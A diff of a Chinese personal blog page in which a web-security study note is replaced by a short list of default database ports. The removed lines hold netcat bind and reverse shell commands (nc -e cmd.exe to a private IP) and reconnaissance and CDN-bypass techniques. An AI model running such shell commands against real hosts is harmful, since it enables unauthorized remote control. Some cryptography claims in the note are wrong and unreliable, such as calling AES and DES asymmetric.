@@ -6,19 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>web安全day1 | frozenfish</title>
+  <title>判断数据库 | frozenfish</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-  <meta name="description" content="1.Nc瑞士军刀使用详解1.tcp监听tcp监听 nc可以作为server端启动一个tcp的监听，默认情况下下面监听的是一个tcp的端口 nc -l -p 9999 客户端测试 1、在B机器上telnet A机器此端口，如下显示表示B机器可以访问A机器此端口 telnet 10.0.1.161 9999 2、B机器上也可以使用nmap扫描A机器的此端口 nmap 10.0.1.161 -p9999">
+  <meta name="description" content="数据库判定​	端口扫描 mysql 3306  oracle 1521  sql server 1433  db2 5000">
 <meta property="og:type" content="article">
-<meta property="og:title" content="web安全day1">
-<meta property="og:url" content="http://example.com/2023/12/15/web%E5%AE%89%E5%85%A8day1/index.html">
+<meta property="og:title" content="判断数据库">
+<meta property="og:url" content="http://example.com/2023/12/26/%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93/index.html">
 <meta property="og:site_name" content="frozenfish">
-<meta property="og:description" content="1.Nc瑞士军刀使用详解1.tcp监听tcp监听 nc可以作为server端启动一个tcp的监听，默认情况下下面监听的是一个tcp的端口 nc -l -p 9999 客户端测试 1、在B机器上telnet A机器此端口，如下显示表示B机器可以访问A机器此端口 telnet 10.0.1.161 9999 2、B机器上也可以使用nmap扫描A机器的此端口 nmap 10.0.1.161 -p9999">
+<meta property="og:description" content="数据库判定​	端口扫描 mysql 3306  oracle 1521  sql server 1433  db2 5000">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-12-15T15:47:33.000Z">
-<meta property="article:modified_time" content="2023-12-16T23:29:54.213Z">
+<meta property="article:published_time" content="2023-12-25T18:01:02.000Z">
+<meta property="article:modified_time" content="2023-12-25T18:01:16.263Z">
 <meta property="article:author" content="frozenfish">
 <meta name="twitter:card" content="summary">
   
@@ -242,14 +242,14 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-web安全day1" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-判断数据库" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
   
   
     <h1 class="article-title" itemprop="name">
-      web安全day1
+      判断数据库
     </h1>
   
 
@@ -261,8 +261,8 @@
               <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
         </span>
 
-<a href="/2023/12/15/web%E5%AE%89%E5%85%A8day1/" class="archive-article-date">
-        <time datetime="2023-12-15T15:47:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-12-15</time>
+<a href="/2023/12/26/%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93/" class="archive-article-date">
+        <time datetime="2023-12-25T18:01:02.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-12-26</time>
 </a>
 
   
@@ -275,7 +275,7 @@
       <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
       <i class="icon-statistics"></i>
       <span class="post-meta-item-text"> 字数统计:</span>
-      <span class="post-count">2.1k字</span>
+      <span class="post-count">18字</span>
     </span>
   </span>
 
@@ -284,7 +284,7 @@
     <span class="post-meta-item-icon">
       <i class="icon-book icon"></i>
       <span class="post-meta-item-text"> 阅读时长≈</span>
-      <span class="post-count">8分</span>
+      <span class="post-count">1分</span>
     </span>
   </span>
 </div>
@@ -295,106 +295,7 @@
   
   <div class="article-entry" itemprop="articleBody">
     
-    <h1 id="1-Nc瑞士军刀使用详解"><a href="#1-Nc瑞士军刀使用详解" class="headerlink" title="1.Nc瑞士军刀使用详解"></a>1.Nc瑞士军刀使用详解</h1><h2 id="1-tcp监听"><a href="#1-tcp监听" class="headerlink" title="1.tcp监听"></a>1.tcp监听</h2><pre><code>tcp监听
-nc可以作为server端启动一个tcp的监听，默认情况下下面监听的是一个tcp的端口
-nc -l -p 9999
-客户端测试
-1、在B机器上telnet A机器此端口，如下显示表示B机器可以访问A机器此端口
-telnet 10.0.1.161 9999
-2、B机器上也可以使用nmap扫描A机器的此端口
-nmap 10.0.1.161 -p9999
-3、使用nc命令作为客户端工具进行端口探测
-nc -vz -w 2 10.0.1.161 9999
-（-v可视化，-z扫描时不发送数据，-w超时几秒，后面跟数字）
-服务端会自动关闭监听。
-4、nc可以扫描连续端口，这个作用非常重要。常常可以用来扫描服务器端口，然后给服务器安全加固
-在客户端B机器上扫描连续的两个端口，如下
-nc -vzw 2 10.0.1.161 9998-9999
-</code></pre>
-<h2 id="2-传文件"><a href="#2-传文件" class="headerlink" title="2.传文件"></a>2.传文件</h2><pre><code>方法1，先启动接收命令
-使用nc传输文件还是比较方便的，因为不用scp和rsync那种输入密码的操作了
-把A机器上的一个rpm文件发送到B机器上
-需注意操作次序，receiver先侦听端口，sender向receiver所在机器的该端口发送数据。 
-步骤1，先在B机器上启动一个接收文件的监听，格式如下
-意思是把赖在9995端口接收到的数据都写到file文件里（这里文件名随意取）
-格式：nc -l port &gt;file
-nc -l -p 9995 &gt;zabbix.rpm
-步骤2，在A机器上往B机器的9995端口发送数据，把下面rpm包发送过去
-nc 10.0.1.162 9995 &lt; zabbix-release-2.4-1.el6.noarch.rpm
-方法2，先启动发送命令
-步骤1，先在B机器上，启动发送文件命令
-下面命令表示通过本地的9992端口发送test.mv文件
-nc -l -p 9992 &lt;test.mv
-步骤2，A机器上连接B机器，取接收文件
-下面命令表示通过连接B机器的9992端口接收文件，并把文件存到本目录下，文件名为test2.mv
-nc 10.0.1.162 9992 &gt;test2.mv
-</code></pre>
-<span id="more"></span>
-
-<h2 id="3-nc反弹shell"><a href="#3-nc反弹shell" class="headerlink" title="3.nc反弹shell"></a>3.nc反弹shell</h2><pre><code>方法1、REMOTE主机绑定SHELL
-在公网监听
-nc -l -p 5354 -t -e c:\winnt\system32\cmd.exe
-或者
-nc -l -p 5555 -t -e cmd.exe
-在内网主动建立连接
-nc -nvv 192.168.153.138 5555
--t是通过telne模式执行 cmd.exe 程序，可以省略。
-讲解：绑定REMOTE主机的CMDSHELL在REMOTE主机的TCP5354端口
-方法2、REMOTE主机绑定SHELL并反向连接
-在公网监听
-nc -lp 5555
-在内网机器反弹
-nc -t -e c:\winnt\system32\cmd.exe 192.168.x.x 5354
-或者
-nc -t -e cmd 192.168.153.140 5555
-讲解：绑定REMOTE主机的CMDSHELL并反向连接到192.168.x.x的TCP5354端口
-</code></pre>
-<h1 id="2-加解密"><a href="#2-加解密" class="headerlink" title="2.加解密"></a>2.加解密</h1><pre><code class="md5">md5
- 16位和32位 0-9 和a-f 组成的字符串
- 
- 
- 解密：
- 1.知道算法
- 2.碰撞枚举生成密文
- 
- 
- 
- 有特殊情况。md5会加salt一个字符串。
-
-    discuz
-</code></pre>
-<pre><code class="sha1">SHA1
-和md5特征差不多，只是位数是40
-</code></pre>
-<pre><code class="NTLM">NTLM
-WINDOWS系统哈希密码，标准通讯安全协议
-win7之后使用的密码
-之前是LM
-</code></pre>
-<pre><code>aes，des，rc4
-都是非对称加密。印度密钥，密文特质与base64类似
-</code></pre>
-<p>大小写敏感</p>
-<pre><code>base64 通常以=结尾、1-9 a-f
-</code></pre>
-<pre><code>url 通常以=结尾、1-9 a-f 通常以%数字字母分割 
-</code></pre>
-<pre><code>编码
-
-
-gbk，utf-8
-</code></pre>
-<h4 id="颜文字加密：aaencode"><a href="#颜文字加密：aaencode" class="headerlink" title="颜文字加密：aaencode"></a>颜文字加密：aaencode</h4><pre><code>jother： +()[]&#123;&#125;
-jsfuck是和jother很像。少了&#123;&#125;
-</code></pre>
-<h4 id="图片里包含文件的技术"><a href="#图片里包含文件的技术" class="headerlink" title="图片里包含文件的技术"></a>图片里包含文件的技术</h4><h1 id="3-判断操作系统"><a href="#3-判断操作系统" class="headerlink" title="3.判断操作系统"></a>3.判断操作系统</h1><h2 id="ttl"><a href="#ttl" class="headerlink" title="ttl"></a>ttl</h2><pre><code>WINDOWS NT/2000   TTL：128
-WINDOWS 95/98     TTL：32
-UNIX              TTL：255
-LINUX             TTL：64
-WIN7          	  TTL：64
-</code></pre>
-<p>nmap使用技术可以具体了解判定方法</p>
-<h1 id="4-数据库判定"><a href="#4-数据库判定" class="headerlink" title="4.数据库判定"></a>4.数据库判定</h1><p>​	端口扫描</p>
+    <h1 id="数据库判定"><a href="#数据库判定" class="headerlink" title="数据库判定"></a>数据库判定</h1><p>​	端口扫描</p>
 <pre><code>mysql 3306
 
 oracle 1521
@@ -403,115 +304,7 @@ sql server 1433
 
 db2 5000
 </code></pre>
-<h1 id="5-主动打点和被动打点"><a href="#5-主动打点和被动打点" class="headerlink" title="5.主动打点和被动打点"></a>5.主动打点和被动打点</h1><pre><code>主动式信息打点：主动使用工具、主动发起测试流量等
-被动式信息打点：调用接口获取信息等
-</code></pre>
-<h1 id="6-收集"><a href="#6-收集" class="headerlink" title="6.收集"></a>6.收集</h1><ul>
-<li><h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2></li>
-<li><h2 id="脚本语言"><a href="#脚本语言" class="headerlink" title="脚本语言"></a>脚本语言</h2></li>
-<li><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2></li>
-<li><h2 id="源码名称"><a href="#源码名称" class="headerlink" title="源码名称"></a>源码名称</h2></li>
-</ul>
-<h1 id="7-泄露原码（cms找不到的情况）"><a href="#7-泄露原码（cms找不到的情况）" class="headerlink" title="7.泄露原码（cms找不到的情况）"></a>7.泄露原码（cms找不到的情况）</h1><h2 id="git和svn"><a href="#git和svn" class="headerlink" title="git和svn"></a>git和svn</h2><pre><code>githack原理
-   .git
-svnhack原理
-   .svn
-</code></pre>
-<h2 id="目录备份"><a href="#目录备份" class="headerlink" title="目录备份"></a>目录备份</h2><pre><code>目录扫描秒了
-</code></pre>
-<h2 id="DsStore"><a href="#DsStore" class="headerlink" title="DsStore"></a>DsStore</h2><pre><code>mac的上传软件
-ds_store
-</code></pre>
-<h2 id="PHP源码泄露"><a href="#PHP源码泄露" class="headerlink" title="PHP源码泄露"></a>PHP源码泄露</h2><pre><code>java有maven
-node.js有npm
-php有composer
-   composer.json配置文件
-         里面有配置信息。插件。中间件信息
-</code></pre>
-<h2 id="WEB-INF-web-xml"><a href="#WEB-INF-web-xml" class="headerlink" title="WEB-INF&#x2F;web.xml"></a>WEB-INF&#x2F;web.xml</h2><pre><code>web-inf 是java的web应用安全目录，要是想访问文件。必须在web.xml文件对要访问的文件进行映射 
-</code></pre>
-<h1 id="8-信息收集"><a href="#8-信息收集" class="headerlink" title="8.信息收集"></a>8.信息收集</h1><p>github的readme邮箱，版权声明。域名常用搜索。</p>
-<h1 id="9。端口扫描"><a href="#9。端口扫描" class="headerlink" title="9。端口扫描"></a>9。端口扫描</h1><ol>
-<li>网络架构。</li>
-<li>内网资产，内网协议</li>
-<li>阻碍信息，cdn，waf。负载，防火墙。</li>
-<li>端口（1-65535）</li>
-</ol>
-<pre><code>nmap 协议。端口扫描。防火墙识别
-masscan 协议，端口扫描、
-</code></pre>
-<h1 id="10-端口渗透"><a href="#10-端口渗透" class="headerlink" title="10.端口渗透"></a>10.端口渗透</h1><h1 id="11-c段-旁注"><a href="#11-c段-旁注" class="headerlink" title="11.c段&#x2F;旁注"></a>11.c段&#x2F;旁注</h1><h2 id="旁注"><a href="#旁注" class="headerlink" title="旁注"></a>旁注</h2><pre><code>171.40.78.44
-www.123.com
-www.44.com
-www.54454.com
-</code></pre>
-<h2 id="c段"><a href="#c段" class="headerlink" title="c段"></a>c段</h2><pre><code>然后用ip反查查看绑定域名。可以进去看看资产
-同网段渗透
-</code></pre>
-<h1 id="cdn判断"><a href="#cdn判断" class="headerlink" title="cdn判断"></a>cdn判断</h1><pre><code>超级ping。全国各地ping一下秒了
-</code></pre>
-<h1 id="waf判断"><a href="#waf判断" class="headerlink" title="waf判断"></a>waf判断</h1><p><a target="_blank" rel="noopener" href="https://www.wangan.com/p/11v71302b8c5ab87">https://www.wangan.com/p/11v71302b8c5ab87</a></p>
-<pre><code>工具
- wafw00f
-</code></pre>
-<h2 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h2><pre><code>工具：
-    lbd
-</code></pre>
-<h1 id="cdn绕过"><a href="#cdn绕过" class="headerlink" title="cdn绕过"></a>cdn绕过</h1><pre><code>1.子域名查询。有些子域名没有加速cdn
-比如你直接访问 www.baidu.com
-他如果没买*.baidu.com
-那么访问test.baidu.com
-      baidu.com都会暴露真实ip
- 注意！！！！！！！！当然这建立在主域名和子域名同个服务器。有些吊毛不这样做
-2.利用网站漏洞暴露真实ip
-3.历史dns记录
-4.MX
-5.国外请求(仅限中国大陆策略下)
-    全球cdn查询:tools.ipip.net
-    找冷们cdn。他一定不会部署cdn
-6.zmap
-7.网络空间搜索引擎：
-    zoomeye。fofa、shodan
-8.部分加速的就可以看网络请求包
-</code></pre>
-<h2 id=""><a href="#" class="headerlink" title=""></a></h2><pre><code>漏洞&amp;遗留文件
-    像是有些配置文件。比如phpInfo.php里面就会配置ip地址.从而得知真实ip，适用于没有内网网卡。
-</code></pre>
-<pre><code>1.传统访问：访问域名-&gt;dns-&gt;目标主机
-2.cdn瑞克派：访问域名-&gt;cdn-&gt;
-3.访问域名-&gt;-&gt;
-4. 主动邮件配合备案
-    让对方服务器主动发邮件给你（注册、找回密码等功能）
-5.抓APP包: 
-    有时候网站使用了CDN，但是可能其APP没有使用，那么通过抓取APP的数据包有可能得出真实的IP地址
-6.国外第三方测试CDN网站（结合了几种方法于一身）
-    https://get-site-ip.com/
-7.查看历史解析IP
-    https://site.ip138.com/
-    https://viewdns.info/
-8.全网扫描FuckCDN(没有办法的办法)
-    厂商查询：
-        https://tools.ipip.net/cdn.php
-    IP库筛地址段
-        https://www.cz88.net/geo-public //IP库资源,要下载客户端
-    全网扫描：
-        https://github.com/Tai7sy/fuckcdn
-9.ssrf漏洞
-    想办法让对方主机访问你，你自己弄个web服务，监听个端口，记录日志。
-    然后通过漏洞·让对方访问你，于是就得到ip&#39;了
-</code></pre>
-<h3 id="牛逼的工具"><a href="#牛逼的工具" class="headerlink" title="牛逼的工具"></a>牛逼的工具</h3><p>​	get-site-ip.com</p>
-<h1 id="找到cdn后咋办？"><a href="#找到cdn后咋办？" class="headerlink" title="找到cdn后咋办？"></a>找到cdn后咋办？</h1><pre><code>绑定host文件直接指向真实ip
-后期测试测对地方
-</code></pre>
-<h1 id="正向连接和反向连接"><a href="#正向连接和反向连接" class="headerlink" title="正向连接和反向连接"></a>正向连接和反向连接</h1><h2 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a><strong>正向连接</strong></h2><p>​		</p>
-<pre><code>正向连接是受害主机监听一个端口，由控制主机主动去连接受害主机的过程，适用于受害主机具有[公网ip](https://so.csdn.net/so/search?q=公网ip&amp;spm=1001.2101.3001.7020)的情况下。例如下面，受害主机具有公网ip，被控主机kali可以通过ip地址访问到受害主机，所以能够使用正相连接来控制受害主机。
-</code></pre>
-<h2 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a><strong>反向连接</strong></h2><pre><code>反向连接是控制主机监听一个端口，由受害主机反向去连接控制主机的过程，适用于受害主机出网（或出网且没有公网ip）的情况。例如，受害主机是一台位于内网，并且没有公网ip且能访问互联网的主机，控制主机无法直接通过ip地址访问到受害主机。所以此时需要在控制主机上监听一个端口，让受害机主动连接控制主机，从而实现对控制主机的控制。
-
-由于正向连接是被攻击者主动连接攻击者，所以不受防火墙策略的限制
-</code></pre>
-
+<h1 id=""><a href="#" class="headerlink" title=""></a></h1>
     
 
     
@@ -572,7 +365,7 @@ www.54454.com
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2023/12/15/web%E5%AE%89%E5%85%A8day1/" alt="微信分享二维码"> -->
+     <!-- <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2023/12/26/%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93/" alt="微信分享二维码"> -->
     </div>
 </div>
 
@@ -587,18 +380,18 @@ www.54454.com
 
 <nav id="article-nav">
   
-    <a href="/2023/12/17/php%E5%BC%80%E5%8F%91/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2023/12/26/%E4%B8%BB%E5%8A%A8%E6%89%93%E7%82%B9%E5%92%8C%E8%A2%AB%E5%8A%A8%E6%89%93%E7%82%B9/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          php开发
+          主动打点和被动打点
         
       </div>
     </a>
   
   
-    <a href="/2023/12/11/linux%E8%BF%90%E7%BB%B4%E6%8A%80%E6%9C%AF/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">linux运维技术</div>
+    <a href="/2023/12/26/%E5%88%A4%E6%96%AD%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">判断操作系统</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -625,7 +418,7 @@ www.54454.com
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-Nc%E7%91%9E%E5%A3%AB%E5%86%9B%E5%88%80%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">1.Nc瑞士军刀使用详解</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-tcp%E7%9B%91%E5%90%AC"><span class="toc-number">1.1.</span> <span class="toc-text">1.tcp监听</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E4%BC%A0%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.</span> <span class="toc-text">2.传文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-nc%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.3.</span> <span class="toc-text">3.nc反弹shell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E5%8A%A0%E8%A7%A3%E5%AF%86"><span class="toc-number">2.</span> <span class="toc-text">2.加解密</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%A2%9C%E6%96%87%E5%AD%97%E5%8A%A0%E5%AF%86%EF%BC%9Aaaencode"><span class="toc-number">2.0.0.1.</span> <span class="toc-text">颜文字加密：aaencode</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E9%87%8C%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6%E7%9A%84%E6%8A%80%E6%9C%AF"><span class="toc-number">2.0.0.2.</span> <span class="toc-text">图片里包含文件的技术</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E5%88%A4%E6%96%AD%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F"><span class="toc-number">3.</span> <span class="toc-text">3.判断操作系统</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ttl"><span class="toc-number">3.1.</span> <span class="toc-text">ttl</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A4%E5%AE%9A"><span class="toc-number">4.</span> <span class="toc-text">4.数据库判定</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-%E4%B8%BB%E5%8A%A8%E6%89%93%E7%82%B9%E5%92%8C%E8%A2%AB%E5%8A%A8%E6%89%93%E7%82%B9"><span class="toc-number">5.</span> <span class="toc-text">5.主动打点和被动打点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-%E6%94%B6%E9%9B%86"><span class="toc-number">6.</span> <span class="toc-text">6.收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F"><span class="toc-number">6.1.</span> <span class="toc-text">操作系统</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80"><span class="toc-number">6.2.</span> <span class="toc-text">脚本语言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">6.3.</span> <span class="toc-text">数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%90%8D%E7%A7%B0"><span class="toc-number">6.4.</span> <span class="toc-text">源码名称</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#7-%E6%B3%84%E9%9C%B2%E5%8E%9F%E7%A0%81%EF%BC%88cms%E6%89%BE%E4%B8%8D%E5%88%B0%E7%9A%84%E6%83%85%E5%86%B5%EF%BC%89"><span class="toc-number">7.</span> <span class="toc-text">7.泄露原码（cms找不到的情况）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#git%E5%92%8Csvn"><span class="toc-number">7.1.</span> <span class="toc-text">git和svn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E5%A4%87%E4%BB%BD"><span class="toc-number">7.2.</span> <span class="toc-text">目录备份</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DsStore"><span class="toc-number">7.3.</span> <span class="toc-text">DsStore</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2"><span class="toc-number">7.4.</span> <span class="toc-text">PHP源码泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB-INF-web-xml"><span class="toc-number">7.5.</span> <span class="toc-text">WEB-INF&#x2F;web.xml</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#8-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">8.</span> <span class="toc-text">8.信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#9%E3%80%82%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">9.</span> <span class="toc-text">9。端口扫描</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#10-%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F"><span class="toc-number">10.</span> <span class="toc-text">10.端口渗透</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#11-c%E6%AE%B5-%E6%97%81%E6%B3%A8"><span class="toc-number">11.</span> <span class="toc-text">11.c段&#x2F;旁注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%81%E6%B3%A8"><span class="toc-number">11.1.</span> <span class="toc-text">旁注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#c%E6%AE%B5"><span class="toc-number">11.2.</span> <span class="toc-text">c段</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cdn%E5%88%A4%E6%96%AD"><span class="toc-number">12.</span> <span class="toc-text">cdn判断</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#waf%E5%88%A4%E6%96%AD"><span class="toc-number">13.</span> <span class="toc-text">waf判断</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1"><span class="toc-number">13.1.</span> <span class="toc-text">负载均衡</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cdn%E7%BB%95%E8%BF%87"><span class="toc-number">14.</span> <span class="toc-text">cdn绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">14.1.</span> <span class="toc-text"></span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%9B%E9%80%BC%E7%9A%84%E5%B7%A5%E5%85%B7"><span class="toc-number">14.1.1.</span> <span class="toc-text">牛逼的工具</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%BE%E5%88%B0cdn%E5%90%8E%E5%92%8B%E5%8A%9E%EF%BC%9F"><span class="toc-number">15.</span> <span class="toc-text">找到cdn后咋办？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5%E5%92%8C%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-number">16.</span> <span class="toc-text">正向连接和反向连接</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%A3%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-number">16.1.</span> <span class="toc-text">正向连接</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5"><span class="toc-number">16.2.</span> <span class="toc-text">反向连接</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%88%A4%E5%AE%9A"><span class="toc-number">1.</span> <span class="toc-text">数据库判定</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text"></span></a></li></ol>
                     </div>
                 </span>
             </div>
